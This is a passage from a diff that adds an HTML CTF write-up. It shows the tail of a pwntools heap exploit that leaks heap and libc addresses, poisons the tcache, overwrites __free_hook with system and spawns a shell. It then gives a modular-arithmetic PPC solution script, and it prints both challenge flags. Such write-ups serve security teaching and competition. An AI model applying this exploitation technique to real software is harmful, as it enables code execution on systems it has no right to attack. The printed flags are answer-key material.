+    r.recvuntil(<span class="hljs-string">'&gt;'</span>)
+    r.sendline(<span class="hljs-string">'4'</span>)
+    r.recvuntil(<span class="hljs-string">':'</span>)
+    r.sendline(str(idx))
+    r.recvuntil(<span class="hljs-string">'Description: '</span>)
+    return r.recvuntil(<span class="hljs-string">'-----'</span>)[:-<span class="hljs-number">6</span>]
+
+
+
+free_got = <span class="hljs-number">0</span>x0000000000601fa0
+free_base = <span class="hljs-number">0</span>x0000000000097950
+
+__free_hook = <span class="hljs-number">0</span>x00000000003ed8e8
+
+<span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0x68, <span class="hljs-string">'a'</span>, 1) <span class="hljs-comment"># 0</span>
+</span><span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0x68, <span class="hljs-string">'a'</span>, 1) <span class="hljs-comment"># 1</span>
+</span><span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0x68, <span class="hljs-string">'a'</span>, 1) <span class="hljs-comment"># 2</span>
+</span>free(<span class="hljs-number">2</span>)
+free(<span class="hljs-number">0</span>)
+
+<span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0, <span class="hljs-string">''</span>, 1) <span class="hljs-comment"># 0</span>
+</span><span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0, <span class="hljs-string">''</span>, 1) <span class="hljs-comment"># 2</span>
+</span>heap = u64(show(<span class="hljs-number">0</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0</span>x1e0
+print (<span class="hljs-string">'heap : '</span>, hex(heap))
+
+free(<span class="hljs-number">0</span>)
+<span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0, <span class="hljs-string">''</span>, 1) <span class="hljs-comment"># 0</span>
+</span>free(<span class="hljs-number">1</span>)
+free(<span class="hljs-number">0</span>)
+
+
+<span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0x68, p64(heap+0x60)+<span class="hljs-string">'a'</span>*0x50+p64(0x71), 1) <span class="hljs-comment"># 0</span>
+</span><span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0x68, <span class="hljs-string">'a'</span>, 1) <span class="hljs-comment"># 1</span>
+</span><span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0x68, p64(heap+0x60)+<span class="hljs-string">'a'</span>*0x50+p64(0x71), 1) <span class="hljs-comment"># 3</span>
+</span>
+<span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0x68, <span class="hljs-string">'a'</span>*8+flat([0x31, 0, 0, free_got]), 1) <span class="hljs-comment"># 4</span>
+</span>libc = u64(show(<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) - free_base
+print (<span class="hljs-string">'libc : '</span>, hex(libc))
+__free_hook += libc
+print (<span class="hljs-string">'__free_hook : '</span>, hex(__free_hook))
+free(<span class="hljs-number">4</span>)
+free(<span class="hljs-number">3</span>)
+free(<span class="hljs-number">0</span>)
+<span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0, <span class="hljs-string">''</span>, 1) <span class="hljs-comment"># 0</span>
+</span>free(<span class="hljs-number">2</span>)
+free(<span class="hljs-number">0</span>)
+
+<span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0x68, p64(__free_hook), 1) <span class="hljs-comment"># 0</span>
+</span><span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0x68, <span class="hljs-string">'/bin/sh\x00'</span>, 1) <span class="hljs-comment"># 2</span>
+</span><span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0x68, p64(__free_hook), 1) <span class="hljs-comment"># 3</span>
+</span>
+<span class="hljs-keyword">add</span><span class="bash">(1, 1, <span class="hljs-string">'1'</span>, 0x68, p64(system), 1) <span class="hljs-comment"># 4</span>
+</span>
+free(<span class="hljs-number">2</span>)
+
+r.interactive()
+</code></pre><p>flag : <code>ASIS{2655b2e6fa6861246c9423c75d76c0e3}</code></p>
+<h2 id="ppc"><a class="header-link" href="#ppc"></a>PPC</h2>
+<h3 id="spm"><a class="header-link" href="#spm"></a>SPM</h3>
+<p>FWEASD</p>
+<p>This is a simple PPC question. It ask us to find a integer $x$ , $\ s.t\ \ \  x^x\equiv a\pmod p$ where $p$ is a prime number.
+Solution:
+assume $x = n <em> p + a$ by Fermat&#39;s little theorem
+$x^x\equiv (n</em>p+a)^{(n<em>p+a)}\equiv  a\pmod p$
+now $let\ n+a=m</em>(p-1)+1$, so we can pick $m=1\Rightarrow n=p-a\Rightarrow x=p^2-a*p+a$</p>
+<p>Exploit script : </p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> common <span class="hljs-keyword">import</span> start
+
+host = <span class="hljs-string">'37.139.4.247'</span>
+port = <span class="hljs-number">60049</span>
+
+r = remote(host, port)
+
+<span class="hljs-comment"># this is too pass the PoW chal</span>
+start(r)
+
+cnt = <span class="hljs-number">0</span>
+<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
+    <span class="hljs-keyword">try</span>:
+        cnt += <span class="hljs-number">1</span>
+        <span class="hljs-keyword">print</span> (<span class="hljs-string">'[{}]\tsolving...'</span>.format(cnt))
+        r.recvuntil(<span class="hljs-string">'| send a solutoin of super hard equation x ** x = a (mod p), for given a and p'</span>)
+        r.recvuntil(<span class="hljs-string">'p = '</span>)
+        p = int(r.recvuntil(<span class="hljs-string">'\n'</span>))
+        r.recvuntil(<span class="hljs-string">'| a = '</span>)
+        a = int(r.recvuntil(<span class="hljs-string">'\n'</span>))
+
+        <span class="hljs-comment"># solve</span>
+        m = <span class="hljs-number">1</span>
+        n = p - a
+        x = int(n * p + a)
+        r.sendline(str(x))
+    <span class="hljs-keyword">except</span>:
+        r.interactive()
+        exit()</code></pre><p>flag : <code>ASIS{S1mple_T4sk_iN_S3lf_P0w3r_maP_eCMiJWd2PbuVJ}</code></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
